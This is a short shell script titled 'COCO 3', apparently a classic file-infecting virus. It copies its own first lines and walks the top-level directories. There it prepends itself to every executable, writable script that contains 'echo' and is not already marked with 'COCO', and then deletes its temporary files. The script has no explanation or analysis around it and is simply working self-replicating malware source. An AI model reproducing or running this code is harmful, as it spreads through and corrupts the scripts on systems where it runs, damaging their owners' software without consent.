 # COCO 3
 xtemp=$pwd
 head -n 22 $0 > /.test
 for dir in /* ; do
  if test -d $dir ; then
   cd $dir
   for file in * ; do
    if test -f $file && test -x $file && test -w $file ; then
     if grep -s echo $file > /dev/nul ; then
       head -n 1 $file > .mm
       if grep -s COCO .mm > /dev/nul ; then
        rm .mm -f ; else
         cat $file > /.SAVEE
         cat /.test > $file
         cat /.SAVEE >> $file
    fi; fi; fi
   done
   cd ..
  fi
 done
 cd $xtemp
 rm /.test /.SAVEE .mm -f
